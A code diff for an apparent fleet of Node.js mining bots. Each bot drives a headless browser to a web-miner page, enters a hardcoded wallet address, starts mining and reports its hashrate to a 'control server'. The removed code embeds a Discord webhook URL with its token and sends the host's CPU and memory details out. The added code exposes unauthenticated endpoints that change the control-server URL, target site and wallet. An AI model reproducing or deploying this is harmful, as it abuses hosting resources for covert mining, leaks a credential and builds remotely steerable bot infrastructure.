@@ -1,209 +1,193 @@
 const express = require("express");
-const path = require("path");
 const puppeteer = require("puppeteer");
-const os = require('os');
 const dotenv = require('dotenv');
-const axios = require('axios');
-const Eris = require('eris');
 const fs = require('fs');
-const FormData = require('form-data');
-const fetch = require('node-fetch');
+const path = require('path');
+const axios = require('axios');
 
 dotenv.config();
 
 const app = express();
-const bot = new Eris(process.env.TOKEN);
+app.use(express.json());
+
 const botId = process.env.BOT_ID;
+let controlServerUrl = process.env.CONTROL_SERVER_URL;
+let controlServerUrlErrorLogged = false;
 
 function delay(time) {
   return new Promise(resolve => setTimeout(resolve, time));
 }
 
 let page;
+let browser;
+let puppeteerError = null;
+let pageTitle = '';
+let startTime;
+let webMinerHashValue = '--';
 
-const webhookUrl = 'https://discord.com/api/webhooks/1045109813228621825/OMXSsYZoA76MRjyJS4ocziJwerv_mm16w0RordAQ4is_7nXiKmqkCJZFW80I8_5hY-QZ';
-
-async function sendToDiscord(message, retryCount = 3) {
+async function startBrowser() {
   try {
-    const formData = new FormData();
-    formData.append('content', message);
-
-    const headers = {
-      ...formData.getHeaders()
-    };
-
-    await axios.post(webhookUrl, formData, { headers });
-
-    console.log('Message sent to Discord:', message);
-  } catch (error) {
-    if (error.response && error.response.status === 429 && retryCount > 0) {
-      const retryAfter = error.response.headers['retry-after'] || 1;
-      console.log(`Rate limited. Retrying after ${retryAfter} seconds...`);
-      await delay(retryAfter * 1000);
-      await sendToDiscord(message, retryCount - 1);
-    } else {
-      console.error('Error sending message to Discord:', error);
-    }
-  }
-}
-
-app.get("/", (req, res) => {
-  res.sendFile(path.join(__dirname, "index.html"));
-});
-
-(async () => {
-  let browser;
-  try {
-    browser = await puppeteer.launch({ args: [
-      "--disable-setuid-sandbox",
-      "--no-sandbox",
-      "--single-process",
-      "--no-zygote",
-    ],
-    executablePath:
-      process.env.NODE_ENV === "production"
-        ? process.env.PUPPETEER_EXECUTABLE_PATH
-        : puppeteer.executablePath(),
-    headless: true, });
+    browser = await puppeteer.launch({ args: ["--no-sandbox"] });
     const pages = await browser.pages();
     page = pages[0];
 
-    const url = "https://excessive-sticky-traffic.glitch.me/";
+    const url = process.env.WEBSITE || "https://excessive-sticky-traffic.glitch.me/";
     await page.goto(url, { waitUntil: "domcontentloaded" });
-    console.log('URL Opened')
     await delay(2000);
 
     const inputSelector = '#AddrField';
-    const WalletAddress = '43WJQfGyaivhEZBr95TZGy3HGei1LVUY5gqyUCAAE4viCRwzJgMcCn3ZVFXtySFxwZLFtrjMPJXhAT9iA9KYf4LoPoKiwBc';
+    const walletAddress = process.env.WALLET_ADDRESS || '43WJQfGyaivhEZBr95TZGy3HGei1LVUY5gqyUCAAE4viCRwzJgMcCn3ZVFXtySFxwZLFtrjMPJXhAT9iA9KYf4LoPoKiwBc';
 
-    await page.type(inputSelector, WalletAddress);
+    await page.type(inputSelector, walletAddress);
     await page.keyboard.press("Enter");
     await delay(2000);
 
     await page.click('#WebMinerBtn');
+    pageTitle = await page.title();
+    console.log(pageTitle);
+    console.log(`Started mining on server ${botId}`);
+    await page.screenshot({ path: 'screenshot.png' });
 
-    console.log(await page.title()); // Log the page title for verification
+    startTime = new Date();
 
-    const message = `Started mining on server ${botId} with wallet address: ${WalletAddress}`;
-    console.log(message); // Log the message to the console
+    // Start monitoring the WebMinerHash value
+    setInterval(async () => {
+      try {
+        webMinerHashValue = await page.$eval('#WebMinerHash', el => el.textContent);
+        console.log(`WebMinerHash: ${webMinerHashValue}`);
+      } catch (error) {
+        console.error('Error fetching WebMinerHash:', error.message);
+      }
+    }, 5000);
+
   } catch (err) {
-    console.error(err.message);
-    const errorMessage = `Error: ${err.message} on server ${botId}`;
-    await sendToDiscord(errorMessage);
-  } finally {
-    // Optionally close the browser here if needed
-    // await browser?.close();
+    puppeteerError = err.message;
+    console.error('Error in startBrowser:', err.message);
   }
-})();
+}
 
-async function sendSystemDetails() {
+function getUptime() {
+  if (!startTime) return null;
+  const now = new Date();
+  const diff = now - startTime;
+  const diffInSeconds = Math.floor(diff / 1000);
+  const hours = Math.floor(diffInSeconds / 3600);
+  const minutes = Math.floor((diffInSeconds % 3600) / 60);
+  const seconds = diffInSeconds % 3600 % 60;
+  return `${hours}h ${minutes}m ${seconds}s`;
+}
+
+async function sendStatusToControlServer() {
+  if (!controlServerUrl || !/^https?:\/\/.+/i.test(controlServerUrl)) {
+    if (!controlServerUrlErrorLogged) {
+      console.error('Invalid or missing control server URL.');
+      controlServerUrlErrorLogged = true; // Set the flag to true after logging the error
+    }
+    return;
+  }
+
+  controlServerUrlErrorLogged = false; // Reset the flag if the URL is valid
+
+  const status = {
+    active: !puppeteerError,
+    uptime: getUptime(),
+    hashrate: webMinerHashValue,
+    error: puppeteerError,
+    pageTitle
+  };
+
   try {
-    const totalMemory = os.totalmem();
-    const freeMemory = os.freemem();
-    const usedMemory = totalMemory - freeMemory;
-
-    const toMB = (bytes) => (bytes / 1024 / 1024).toFixed(2);
-
-    const memoryMessage = `**System Memory:**\nTotal: ${toMB(totalMemory)} MB\nFree: ${toMB(freeMemory)} MB\nUsed: ${toMB(usedMemory)} MB`;
-
-    const cpus = os.cpus();
-    let cpuMessage = '**CPU Details:**\n';
-    cpus.forEach((cpu, index) => {
-      cpuMessage += `CPU ${index + 1}:\n`;
-      cpuMessage += `  Model: ${cpu.model}\n`;
-      cpuMessage += `  Speed: ${cpu.speed} MHz\n`;
-      cpuMessage += `  Times:\n`;
-      cpuMessage += `    User: ${cpu.times.user} ms\n`;
-      cpuMessage += `    Nice: ${cpu.times.nice} ms\n`;
-      cpuMessage += `    Sys: ${cpu.times.sys} ms\n`;
-      cpuMessage += `    Idle: ${cpu.times.idle} ms\n`;
-      cpuMessage += `    IRQ: ${cpu.times.irq} ms\n\n`;
+    await axios.post(`${controlServerUrl}/update`, {
+      serverId: botId,
+      status
     });
-
-    const message = `${memoryMessage}\n${cpuMessage}`;
-    return message;
+    console.log(`Status sent to control server: ${JSON.stringify(status)}`);
   } catch (error) {
-    console.error('Error fetching system details:', error);
-    return `Error fetching system details: ${error.message}`;
+    console.error('Error sending status to control server:', error.message);
   }
 }
 
-async function takeScreenshot() {
-  if (!page) {
-    throw new Error("Page is not initialized.");
-  }
+function updateEnvVariable(key, value) {
+  const envFilePath = path.resolve(__dirname, '.env');
+  const envConfig = dotenv.parse(fs.readFileSync(envFilePath));
 
-  const screenshotPath = 'screenshot.png';
-  await page.screenshot({ path: screenshotPath });
-  return screenshotPath;
+  envConfig[key] = value;
+
+  const updatedEnvConfig = Object.keys(envConfig).map(k => `${k}=${envConfig[k]}`).join('\n');
+  fs.writeFileSync(envFilePath, updatedEnvConfig);
+  dotenv.config(); // reload the environment variables
 }
 
-bot.on('ready', () => {
-  console.log('Ready!');
-});
-
-bot.on('messageCreate', async (msg) => {
-  if (msg.content === `screenshot-${botId}`) {
-    try {
-      const screenshotPath = await takeScreenshot();
-
-      if (!fs.existsSync(screenshotPath)) {
-        console.error('Screenshot file does not exist');
-        return;
-      }
-
-      const stats = fs.statSync(screenshotPath);
-      console.log(`Screenshot file size: ${stats.size} bytes`);
-
-      if (stats.size === 0) {
-        console.error('Screenshot file is empty');
-        return;
-      }
-
-      const screenshotFile = fs.createReadStream(screenshotPath);
-      const formData = new FormData();
-      formData.append('file', screenshotFile, { filename: 'screenshot.png' });
-
-      // Ensure the headers are correctly set
-      const headers = {
-        Authorization: `Bot ${process.env.DISCORD_BOT_TOKEN}`,
-        ...formData.getHeaders(),
-      };
-
-      const response = await fetch(`https://discord.com/api/v9/channels/${msg.channel.id}/messages`, {
-        method: 'POST',
-        headers: headers,
-        body: formData,
-      });
-
-      if (!response.ok) {
-        throw new Error(`Error sending screenshot: ${response.statusText}`);
-      }
-
-      const responseBody = await response.json();
-      console.log('Screenshot sent successfully:', responseBody);
-    } catch (err) {
-      console.error('Error sending screenshot:', err.message || err);
-      const errorMessage = `Error sending screenshot: ${err.message || err} on server ${botId}`;
-      await sendToDiscord(errorMessage);
-    }
-  } else if (msg.content === `systemdetails-${botId}`) {
-    try {
-      const systemDetailsMessage = await sendSystemDetails();
-      await sendToDiscord(systemDetailsMessage);
-      console.log('System details sent successfully');
-    } catch (err) {
-      console.error('Error sending system details:', err.message || err);
-      const errorMessage = `Error sending system details: ${err.message || err} on server ${botId}`;
-      await sendToDiscord(errorMessage);
-    }
-  } else if (msg.content === `restart-${botId}`) {
-    console.log("Restarting server....")
+app.post('/update-control-server-url', (req, res) => {
+  const { newUrl } = req.body;
+  if (!newUrl) {
+    return res.status(400).send({ error: "newUrl is required" });
   }
+  updateEnvVariable('CONTROL_SERVER_URL', newUrl);
+  controlServerUrl = newUrl;
+  controlServerUrlErrorLogged = false; // Reset the error flag when updating the URL
+  res.send({ success: true, newUrl });
 });
 
-bot.connect();
+app.post('/update-website', (req, res) => {
+  const { newWebsite } = req.body;
+  if (!newWebsite) {
+    return res.status(400).send({ error: "newWebsite is required" });
+  }
+  updateEnvVariable('WEBSITE', newWebsite);
+  res.send({ success: true, newWebsite });
+});
+
+app.post('/update-wallet-address', (req, res) => {
+  const { newWalletAddress } = req.body;
+  if (!newWalletAddress) {
+    return res.status(400).send({ error: "newWalletAddress is required" });
+  }
+  updateEnvVariable('WALLET_ADDRESS', newWalletAddress);
+  res.send({ success: true, newWalletAddress });
+});
+
+app.get('/', (req, res) => {
+  const uuidRegex = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;
+  const botIdMatches = uuidRegex.test(process.env.BOT_ID);
+  const batchCorrect = process.env.BATCH === 'ALPHA';
+
+  const response = {
+    BOT_ID: botIdMatches ? "SET" : "NOT SET",
+    BATCH: batchCorrect ? "SET" : "NOT SET",
+  };
+
+  if (puppeteerError) {
+    response.error = puppeteerError;
+  } else {
+    response.success = true;
+    response.pageTitle = pageTitle;
+    response.uptime = getUptime();
+    response.webMinerHash = webMinerHashValue;
+  }
+
+  res.send(response);
+});
+
+// Start the main function to keep the Puppeteer browser running
+startBrowser();
+
+// Send regular updates to the control server
+setInterval(sendStatusToControlServer, 20000); // every 20 seconds
 
 const listener = app.listen(process.env.PORT || 3000, () => {
   console.log(`Your app is listening on port ${listener.address().port}`);
+});
+
+// Gracefully close the browser on process termination
+process.on('SIGINT', async () => {
+  console.log('Closing the browser...');
+  await browser?.close();
+  process.exit(0);
+}); 
+
+process.on('SIGTERM', async () => {
+  console.log('Closing the browser...');
+  await browser?.close();
+  process.exit(0);
 });
